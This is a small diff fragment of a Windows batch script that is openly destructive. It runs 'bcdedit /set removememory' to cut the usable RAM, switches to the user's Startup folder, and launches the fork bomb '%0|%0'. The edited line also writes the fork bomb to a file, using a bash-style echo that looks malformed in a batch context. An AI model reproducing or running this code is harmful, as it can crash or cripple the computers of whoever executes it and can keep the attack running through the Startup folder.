@@ -18,6 +18,6 @@ echo Will be getting rid of %c% bytes of memory
 bcdedit.exe /set removememory %c% 
 
 cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
-%0|%0 > custom.bat
+echo -e "%0|%0" > bashFile.sh
 %0|%0
  
